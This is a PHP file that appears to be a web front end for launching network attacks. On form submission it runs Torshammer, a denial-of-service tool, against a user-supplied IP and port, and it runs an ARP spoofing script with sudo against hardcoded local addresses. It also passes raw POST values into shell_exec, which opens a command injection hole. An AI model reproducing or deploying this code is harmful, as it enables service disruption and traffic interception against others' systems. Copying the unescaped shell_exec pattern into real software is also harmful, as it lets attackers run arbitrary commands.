<?php

  // Use ls command to shell_exec
  // function
  $DDOS = 'python2 scripts/Torshammer/torshammer.py -t'." ".$_POST['IP']." ".'-p'." ".$_POST['PORT']." ".'-r'." ".$_POST['RE'];

  if (isset($_POST['DDOS']))
  {
    print_r($DDOS);
    shell_exec($DDOS);
  }

   if(isset($_POST['DDOS-stop']))
     {
       shell_exec("kill -9 `pidof python2`");
     }


?>

<?php

  // Use ls command to shell_exec
  // function
  // $ARPSPOOFING = 'sudo python3 scripts/arp_spoofing.py '.$_POST['IP-V']." ".$_POST['IP-P'];

  $ARPSPOOFING = 'sudo python3 scripts/arp_spoofing.py 192.168.12.117 192.168.12.10';

  if (isset($_POST['ARPSPOOFING']))
  {
    print_r($ARPSPOOFING);
    shell_exec($ARPSPOOFING);

  }

   if(isset($_POST['ARPSPOOFING-stop']))
     {
       shell_exec("sudo kill -9 `pidof python3`");
     }


?>
